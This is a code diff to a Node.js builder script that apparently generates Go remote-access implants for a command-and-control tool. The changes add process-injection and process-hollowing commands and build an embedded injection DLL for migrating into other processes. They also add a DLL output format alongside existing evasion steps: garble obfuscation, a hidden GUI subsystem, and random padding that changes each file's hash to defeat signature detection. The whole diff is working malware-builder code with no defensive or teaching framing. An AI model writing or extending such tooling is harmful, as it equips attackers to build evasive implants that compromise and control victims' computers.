@@ -43,6 +43,10 @@ const PLAIN_COMMANDS = {
   obfPwd: 'pwd',
   obfQ: 'q',
   obfCd: 'cd',
+  obfInjectdll: 'injectdll',
+  obfInjectapc: 'injectapc',
+  obfInjectmanual: 'injectmanual',
+  obfHollowprocess: 'hollowprocess',
 };
 
 const APP_NAMES = [
@@ -105,6 +109,41 @@ function which(cmd) {
     p.on('error', () => resolve(null));
     p.on('close', (code) => resolve(code === 0 ? out.trim().split(/\r?\n/)[0] : null));
   });
+}
+
+/** Locate LLVM-MinGW / WinLibs bin dir so CGO DLL builds work. */
+function findMingwBin() {
+  const extras = [];
+  const local = process.env.LOCALAPPDATA || '';
+  const wingetPkgs = path.join(local, 'Microsoft', 'WinGet', 'Packages');
+  if (fs.existsSync(wingetPkgs)) {
+    for (const name of fs.readdirSync(wingetPkgs)) {
+      if (!/mingw|llvm/i.test(name)) continue;
+      const base = path.join(wingetPkgs, name);
+      const walk = (dir, depth) => {
+        if (depth > 4 || !fs.existsSync(dir)) return;
+        const gcc = path.join(dir, 'gcc.exe');
+        if (fs.existsSync(gcc)) {
+          extras.push(dir);
+          return;
+        }
+        try {
+          for (const ent of fs.readdirSync(dir, { withFileTypes: true })) {
+            if (ent.isDirectory()) walk(path.join(dir, ent.name), depth + 1);
+          }
+        } catch { /* ignore */ }
+      };
+      walk(base, 0);
+    }
+  }
+  for (const d of [
+    'C:\\mingw64\\bin',
+    'C:\\llvm-mingw\\bin',
+    path.join(process.env.ProgramFiles || 'C:\\Program Files', 'llvm-mingw', 'bin'),
+  ]) {
+    if (fs.existsSync(path.join(d, 'gcc.exe'))) extras.push(d);
+  }
+  return extras[0] || null;
 }
 
 function run(cmd, args, opts = {}) {
@@ -225,6 +264,13 @@ async function generateBuild(options = {}) {
     fs.copyFileSync(src, path.join(workDir, toName));
   }
 
+  // CGO stub for -buildmode=c-shared (only compiled with -tags dll)
+  fs.writeFileSync(
+    path.join(workDir, 'dll_cgo.go'),
+    `//go:build dll\n\npackage main\n\nimport "C"\n`,
+    'utf8'
+  );
+
   // Minimal go.mod for the temp module
   fs.writeFileSync(
     path.join(workDir, 'go.mod'),
@@ -232,33 +278,120 @@ async function generateBuild(options = {}) {
     'utf8'
   );
 
+  const format = String(options.format || 'exe').toLowerCase(); // exe | dll
+  const mingwBin = platform === 'windows' ? findMingwBin() : null;
+  let injectDllName = null;
+  let injectDllPacked = false;
+
+  // Stub so main.go compiles before/without a packed DLL
+  fs.writeFileSync(
+    path.join(workDir, 'embedded_dll.go'),
+    `package main\n\nvar embeddedInjectDLL []byte\n`,
+    'utf8'
+  );
+
+  // --- Step A: build real inject DLL (LoadLibrary payload) ---
+  if (platform === 'windows' && mingwBin) {
+    const dllName = 'inject_payload.dll';
+    const dllPath = path.join(workDir, dllName);
+    const cc = arch === '386' ? 'i686-w64-mingw32-gcc' : 'x86_64-w64-mingw32-gcc';
+    const dllEnv = {
+      ...process.env,
+      PATH: `${mingwBin};${process.env.PATH || ''}`,
+      GOOS: 'windows',
+      GOARCH: arch,
+      CGO_ENABLED: '1',
+      CC: cc,
+    };
+    const dllLdflags = `-s -w -X main.BuildMode=dll -buildid=${buildid}dll`;
+    console.log(`[BUILDER] Building inject DLL (${arch}) with ${cc}...`);
+    try {
+      await run(
+        'go',
+        ['build', '-tags', 'dll', '-buildmode=c-shared', '-trimpath', `-ldflags=${dllLdflags}`, '-o', dllPath, '.'],
+        { cwd: workDir, env: dllEnv }
+      );
+      if (fs.existsSync(dllPath) && fs.statSync(dllPath).size > 1000) {
+        injectDllName = dllName;
+        injectDllPacked = true;
+        // Embed into EXE via go:embed (overwrite stub)
+        fs.writeFileSync(
+          path.join(workDir, 'embedded_dll.go'),
+          `package main\n\nimport _ "embed"\n\n//go:embed ${dllName}\nvar embeddedInjectDLL []byte\n`,
+          'utf8'
+        );
+        console.log(`[BUILDER] Inject DLL ready (${fs.statSync(dllPath).size} bytes) — will embed in EXE`);
+      }
+    } catch (e) {
+      console.warn('[BUILDER] DLL build failed (migrate will be unavailable):', e.message);
+    }
+  } else if (platform === 'windows' && !mingwBin) {
+    console.warn('[BUILDER] MinGW not found — EXE will not include migrate DLL pack');
+  }
+
+  // If user asked for dll-only artifact as primary download
+  if (platform === 'windows' && format === 'dll') {
+    if (!injectDllPacked) throw new Error('DLL build failed — need MinGW/GCC (CGO)');
+    const dllSrc = path.join(workDir, injectDllName);
+    const baseName = (options.outputName || `implant_${platform}_${arch}`).replace(/[<>:"/\\|?*\s]/g, '_');
+    const outName = baseName.toLowerCase().endsWith('.dll') ? baseName : `${baseName}.dll`;
+    const outPath = path.join(workDir, outName);
+    fs.copyFileSync(dllSrc, outPath);
+    const pad = crypto.randomBytes(128 + (crypto.randomBytes(1)[0] % 512));
+    fs.appendFileSync(outPath, pad);
+    const stat = fs.statSync(outPath);
+    const sha256 = crypto.createHash('sha256').update(fs.readFileSync(outPath)).digest('hex');
+    const meta = {
+      id,
+      platform,
+      arch,
+      host,
+      port,
+      fileName: outName,
+      size: stat.size,
+      sha256,
+      xorKeyLen: xorKey.length,
+      shiftValue,
+      stamp: stamp.slice(0, 16),
+      tool: 'go-cshared',
+      format: 'dll',
+      injectDllPacked: true,
+      createdAt: new Date().toISOString(),
+    };
+    fs.writeFileSync(path.join(workDir, 'meta.json'), JSON.stringify(meta, null, 2));
+    const list = readManifest();
+    list.unshift(meta);
+    writeManifest(list.slice(0, 100));
+    return meta;
+  }
+
   const ext = platform === 'windows' ? '.exe' : '';
   const baseName = (options.outputName || `implant_${platform}_${arch}`).replace(/[<>:"/\\|?*\s]/g, '_');
   const outName = baseName.endsWith(ext) || !ext ? `${baseName}${ext || ''}` : `${baseName}${ext}`;
   const outPath = path.join(workDir, outName);
 
   const ldflags = platform === 'windows'
-    ? `-s -w -H=windowsgui -buildid=${buildid}`
+    ? `-s -w -H=windowsgui -X main.BuildMode=exe -buildid=${buildid}`
     : `-s -w -buildid=${buildid}`;
 
   const env = {
+    ...process.env,
     GOOS: platform === 'windows' ? 'windows' : 'linux',
     GOARCH: arch,
     CGO_ENABLED: '0',
   };
 
-  // Add debugging for 386 builds
   if (arch === '386') {
     console.log(`[BUILDER] Building 386 binary: ${outPath}`);
-    console.log(`[BUILDER] GOOS=${env.GOOS} GOARCH=${env.GOARCH}`);
   }
 
   const garblePath = await which('garble');
   let tool = 'go';
   let args;
 
-  // Build package (.) so platform_*.go build tags are included
-  if (garblePath) {
+  // Build EXE package (.) — excludes dll_cgo.go (tag dll)
+  if (garblePath && !injectDllPacked) {
+    // garble + embed can be flaky; skip garble when we embedded a DLL
     tool = garblePath;
     args = ['-literals', '-tiny', `-seed=${stamp}`, 'build', `-ldflags=${ldflags}`, '-o', outPath, '.'];
   } else {
@@ -269,7 +402,6 @@ async function generateBuild(options = {}) {
   try {
     await run(tool, args, { cwd: workDir, env });
   } catch (e) {
-    // If garble failed, fall back to plain go
     if (tool !== 'go') {
       await run('go', ['build', '-trimpath', `-ldflags=${ldflags}`, '-o', outPath, '.'], { cwd: workDir, env });
       tool = 'go (fallback)';
@@ -280,6 +412,12 @@ async function generateBuild(options = {}) {
 
   if (!fs.existsSync(outPath)) {
     throw new Error('Build finished but output file missing');
+  }
+
+  // Also keep a downloadable copy of the inject DLL next to the EXE
+  if (injectDllPacked && injectDllName) {
+    const sideDll = outName.replace(/\.exe$/i, '') + '_inject.dll';
+    fs.copyFileSync(path.join(workDir, injectDllName), path.join(workDir, sideDll));
   }
 
   // Append polymorphic padding (changes file hash without breaking PE/ELF load)
@@ -302,6 +440,8 @@ async function generateBuild(options = {}) {
     shiftValue,
     stamp: stamp.slice(0, 16),
     tool: path.basename(String(tool)),
+    format: 'exe',
+    injectDllPacked,
     createdAt: new Date().toISOString(),
   };
   fs.writeFileSync(path.join(workDir, 'meta.json'), JSON.stringify(meta, null, 2));
